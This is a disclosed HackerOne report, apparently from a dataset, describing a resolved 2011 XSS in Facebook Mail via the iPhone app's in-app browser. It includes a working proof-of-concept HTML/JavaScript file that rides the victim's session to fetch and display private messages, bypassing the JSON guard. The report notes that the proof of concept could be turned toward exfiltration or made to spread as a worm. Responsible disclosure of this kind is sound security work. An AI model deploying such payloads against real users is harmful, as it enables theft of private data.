---
source: hackerone
dataset: elamaran619/hackerone_disclosed_reports
h1_id: '390344'
original_report_id: '390344'
title: iPhone app XSS in Facebook Mail
team_handle: meta
created_at: '2011-07-27T19:59:52.000Z'
disclosed_at: '2018-08-03T20:08:45.145Z'
has_bounty: false
visibility: full
substate: resolved
vote_count: 203
tags:
- hackerone
---

# iPhone app XSS in Facebook Mail

## Metadata

- HackerOne Report ID: 390344
- Weakness: 
- Program: meta
- Disclosed At: 2018-08-03T20:08:45.145Z
- Has Bounty: No
- Visibility: full
- Substate: resolved

## Original Report

**From Alex Rice:**
> Hi Jobert, Michiel -
> 
> I run the Product Security team over at Facebook. ██████ just sent along a note mentioning that you're attempting to contact us with information on a XSS in Facebook's mail site. Can you share any additional details?
> 
> Thanks!

**Our response:**
During a recent security review we did for ██████, we discovered a Cross-Site Scripting (XSS) issue related to how in-app iOS browsers handle the rendering of attachments. We did a quick check to see if a related vulnerability would be present at Facebook. 

We discovered the Facebook Mail feature is particularly vulnerable to this. The XSS can be used to get access to other messages in a user’s inbox and can be wormified for greater impact.

To reproduce this vulnerability, you need to send the attached file - {F328174} - to someone’s Facebook email address. This file contains the proof of concept exploit code. When the user opens the attachment via the Facebook iPhone app (might work on other mobile devices as well), the attached HTML file containing the exploit gets executed in the same origin as https://iphone.facebook.com. In this particular proof of concept, the victim will see their private messages displayed. It would be trivial to expand the PoC to send this data to an external server, or access other private information such as the victim’s photos.

To clarify further, when opening the attachment on an iPhone via the Facebook app, the current session is used to authenticate and render the attachment in the mobile in-app browser. Because of the shared session, the browser can send AJAX calls to https://iphone.facebook.com and retrieve content. This also bypasses the frame busting mechanism and JSON obfuscation system, as it is unnecessary to do a cross-domain attack and the retrieved `for (;;);` can be removed on-the-fly given that the XSS operates in the same origin.

Because we're in the Bay Area now and scheduled to fly back to the Netherlands on Monday, we asked ██████ if they could potentially expedite things a bit and see if we could do a meeting at FB and discuss our findings.

**fb-mail-poc.html:**
```js
<script type="text/javascript" src="http://www.online24.nl/static/assets/js/jquery-1.4.4.min.js"></script>
<script type="text/javascript">
	// http://iphone.facebook.com/photo_dashboard.php?endtime=1311780199&__ajax__&__metablock__=9
	$(function(){
		parse_messages = function()
		{
			$('.twoLines.preview>.snippet').each(function(index,value)
			{
				lines = value.innerHTML.replace(/(<([^>]+)>)/ig,'');
				
				alert(lines);
			});
		};
		
		$.ajax({
		 	url:"https://iphone.facebook.com/messages/?refid=7&__ajax__&__m_async_page__&__jewels__&__metablock__=3",
			success:function(data)
			{
				x = eval('('+data.substr(9)+')');
				document.write('<div style="display:none;">'+x.m[1].html+'</div>');
				
				parse_messages();
			}
		});
	});
</script>
```

## Extracted Security Notes

### Likely Vulnerability Class

*Leave this section for future enrichment.*

### Likely Root Cause

*Leave this section for future enrichment.*

### Potential Impact

*Leave this section for future enrichment.*

### Defensive Test Cases

*Leave this section for future enrichment.*

### Remediation Ideas

*Leave this section for future enrichment.*
